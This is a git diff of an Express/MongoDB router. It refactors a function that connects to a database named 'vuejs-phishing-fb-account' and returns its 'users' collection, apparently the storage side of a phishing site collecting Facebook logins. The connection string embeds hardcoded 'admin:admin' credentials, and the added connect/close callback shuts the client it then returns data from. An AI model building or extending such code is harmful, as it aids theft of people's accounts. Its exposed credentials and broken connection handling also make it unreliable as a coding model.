@@ -28,12 +28,18 @@ router.delete('/:id', async (req, res) => {
 })
 
 async function loadUserCollection() {
-    const user = await mongodb.MongoClient.connect('mongodb+srv://admin:admin@cluster0-g7fhu.gcp.mongodb.net/test?retryWrites=true&w=majority', {
+    const uri = 'mongodb+srv://admin:admin@cluster0-g7fhu.gcp.mongodb.net/test?retryWrites=true&w=majority'
+    const user = await mongodb.MongoClient.connect(uri, {
         useNewUrlParser: true,
         useUnifiedTopology: true
     })
 
+    user.connect(err => {
+        user.close();
+    });
+
     return user.db('vuejs-phishing-fb-account').collection('users')
+    
 }
 
 module.exports = router
